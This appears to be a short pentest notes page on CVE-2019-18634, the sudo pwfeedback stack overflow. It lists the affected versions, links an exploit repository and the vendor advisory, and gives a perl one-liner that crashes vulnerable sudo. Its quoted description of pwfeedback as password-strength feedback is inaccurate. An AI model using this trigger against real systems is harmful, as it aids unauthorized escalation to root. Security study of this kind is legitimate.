# CVE 2019-18634 (Buf Overflow)

{% embed url="https://github.com/saleemrashid/sudo-cve-2019-18634" %}

{% embed url="https://www.sudo.ws/security/advisories/pwfeedback/" %}

#### Affected version of this vulnerability: Sudo versions 1.7.1 to 1.8.30

#### If pwfeedback is enabled in sudoers, the stack overflow may allow unprivileged users to escalate to the root account.

> If "pwfeedback" is being used in relation to `sudo`, it could potentially refer to some form of password feedback or interaction related to the password you enter when using `sudo`. This might involve providing visual cues or messages about the password's strength, validity, or other relevant information.

```bash
$ sudo -l
#    Matching Defaults entries for millert on linux-build:
#	insults, pwfeedback, mail_badpass, mailerpath=/usr/sbin/sendmail

#    User millert may run the following commands on linux-build:
#	(ALL : ALL) ALL

# Check if you see any password visual feedback like *****
$ su root 
$ sudo su root 

# Exploiting the bug does not require sudo permissions, merely that pwfeedback be enabled. 
# The bug can be reproduced by passing a large input to sudo via a pipe when it prompts for a password.

$ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
#    Password: Segmentation fault
```
